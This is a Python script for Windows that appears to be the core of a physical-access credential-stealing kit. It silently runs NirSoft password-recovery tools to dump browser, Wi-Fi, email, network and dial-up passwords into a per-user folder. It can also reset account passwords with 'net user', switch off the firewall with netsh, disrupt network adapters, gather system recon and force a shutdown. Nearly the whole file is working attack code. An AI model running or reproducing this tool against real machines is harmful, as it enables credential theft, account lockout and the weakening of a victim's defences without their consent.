import os, sys, ctypes, getpass, socket, subprocess, urllib.request, math, wmi, platform, datetime, time
exec(open("config.py").read())

si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

# setting up directory
usr = getpass.getuser()
if not os.path.exists("hosts/" + usr):
    os.makedirs("hosts/" + usr)
    root = usr
elif duplicate_exec:
    usr_x = 1
    usr_ct = 2
    while usr_x:
        usr_ct = str(usr_ct)
        if not os.path.exists("hosts/"+ usr + " (" + usr_ct + ")"):
            os.makedirs("hosts/" + usr + " (" + usr_ct + ")")
            root = usr + " (" + usr_ct + ")"
            usr_x = 0
        else:
            usr_ct = int(usr_ct)
            usr_ct += 1
else:
    sys.exit()
rootdir = "..\\hosts\\" + root + "\\"
os.chdir("payloads")
# logging start
if logging:
    fl = open(rootdir+"Log.txt", "w")
    d = datetime.datetime.now()
    start_time = time.time()
    logstart1 = d.strftime(r"%d-%m-%Y -> %A, %d/%B/%Y")
    logstart2 = d.strftime(r"%I:%M:%S %p")
    fl.write("Started on:\n\n"+"Date: "+logstart1+"\nTime: "+logstart2)
    fl.close()


# checking internet connectivity
try:
    socket.create_connection(("www.google.com", 80))
    inet = 1
except OSError:
    pass
    inet = 0

# password recovery
if browser_pwds:
    p = rootdir + "Browser passwords.html"
    subprocess.call(["WebBrowserPassView.exe", "/shtml", p], startupinfo=si)
if wireless_keys:
    p = rootdir + "Wireless passwords.html"
    subprocess.call(["WirelesskeyView.exe", "/shtml", p], startupinfo=si)
if email_pst_pwds:
    p = rootdir + "Email pst passwords.html"
    subprocess.call(["PstPassword.exe", "/shtml", p], startupinfo=si)
if mail_pwds:
    p = rootdir + "Mail passwords.html"
    subprocess.call(["mailpv.exe", "/shtml", p], startupinfo=si)
if network_pwds:
    p = rootdir + "Network passwords.html"
    subprocess.call(["netpass.exe", "/shtml", p], startupinfo=si)
if msn_pwds:
    p = rootdir + "MSN passwords.html"
    subprocess.call(["mspass.exe", "/shtml", p], startupinfo=si)
if dialup_pwds:
    p = rootdir + "Dialup passwords.html"
    subprocess.call(["Dialupass.exe" ,"/shtml", p], startupinfo=si)

# recon
if network_scan and inet:
    p = rootdir + "Network scan.html"
    subprocess.call(["WNetWatcher.exe", "/shtml", p], startupinfo=si)

# changing nt password
if change_nt_pwd["current_acc_controller"]:
    xpwd = change_nt_pwd["current_acc_pwd"]
    subprocess.call("cmd /c net user "+'"'+"%username%"+'" '+'"'+xpwd+'"', startupinfo=si)
if change_nt_pwd["diff_acc_controller"]:
    xusr = change_nt_pwd["diff_acc_usr"]
    xpwd = change_nt_pwd["diff_acc_pwd"]
    subprocess.call("cmd /c net user "+'"'+xusr+'" '+'"'+xpwd+'"', startupinfo=si)

# Network based executions
if disable_firewall:
    subprocess.call("netsh advfirewall set allprofiles state off", startupinfo=si)
if enable_firewall:
    subprocess.call("netsh advfirewall set allprofiles state on", startupinfo=si)
if release_net_adapters:
    subprocess.call("ipconfig /release", startupinfo=si)
if renew_net_adapters:
    subprocess.call("ipconfig /renew", startupinfo=si)
if flush_dns:
    subprocess.call("ipconfig /flushdns", startupinfo=si)
if register_dns:
    subprocess.call("ipconfig /registerdns", startupinfo=si)

# Recon
if batch_recon:
    if inet:
        ext_ip = urllib.request.urlopen("https://api.ipify.org/").read()
        ip = str(ext_ip)
    else:
        ip = "N/A"
    inet = str(inet)
    subprocess.call(["br.bat", root, rootdir, inet, ip], startupinfo=si)
if sysinfo:
    c = wmi.WMI()    
    sysinfo = c.Win32_ComputerSystem()[0]
    osinfo = c.Win32_OperatingSystem()[0]
    cpuinfo = c.Win32_Processor()[0]
    hddinfo = c.Win32_LogicalDisk()[0]
    raminfo = c.Win32_PhysicalMemory()[0]

    manufacturer = sysinfo.Manufacturer
    model = sysinfo.Model
    ramtotal = int(sysinfo.TotalPhysicalMemory)
    hddtotal = int(hddinfo.size)
    ramsize = round(ramtotal / 1024 / 1024 / 1024)
    hddsize = round(hddtotal / 1024 / 1024 / 1024)
    fh = open(rootdir+"System information.txt", "w")
    fh.write("Primary recon:\n===============================\n\n")
    fh.write("Model: " + manufacturer + " " + model+"\n")
    fh.write("HDD: " + str(hddsize) + " GB"+"\n")
    fh.write("RAM: " + str(ramsize) + " GB"+"\n")
    fh.write("CPU: " + cpuinfo.name+"\n")
    fh.write("OS: " + osinfo.caption+"\n")
    fh.write("\nPlatform recon:\n===============================\n\n")
    fh.write("Machine: " + platform.machine()+"\n")
    fh.write("Hostname: " + platform.node()+"\n")
    fh.write("Platform: " + platform.platform()+"\n")
    fh.write("Processor: " + platform.processor()+"\n")
    fh.write("Release: " + platform.release()+"\n")
    fh.write("Version: " + platform.version()+"\n")
    fh.write("System: " + platform.system()+"\n")
    fh.write("System alias: " + str(platform.system_alias(platform.system(), platform.release(), platform.version()))+"\n")
    fh.write("Uname: " + str(platform.uname())+"\n")
    fh.close()

# logging end
if logging:
    fl = open(rootdir+"Log.txt", "a")
    d2 = datetime.datetime.now()
    end_time = time.time()
    et = end_time - start_time
    et = round(et)
    elapsed_time = str(et)
    logend1 = d2.strftime(r"%d-%m-%Y -> %A, %d/%B/%Y")
    logend2 = d2.strftime(r"%I:%M:%S %p")
    fl.write("\n\n\nFinished on:\n\n"+"Date: "+logend1+"\nTime: "+logend2)
    fl.write("\n\nElapsed time: "+elapsed_time+" secs")
    fl.close()


# msg box
if msgbox["controller"]:
    ctypes.windll.user32.MessageBoxW(0, msgbox["msg"], msgbox["title"], msgbox["buttons"])

# shutdown code
if power["controller"]:
    if power["mode"] != "":
        shutdown = "shutdown -" + power['mode']
        if power["comment"] != "":
            shutdown = shutdown + " -c " + "\"" + power['comment'] + "\""
        if power["timeout"] != "":
                shutdown = shutdown + " -t " + power['timeout']
        subprocess.call(shutdown, startupinfo=si)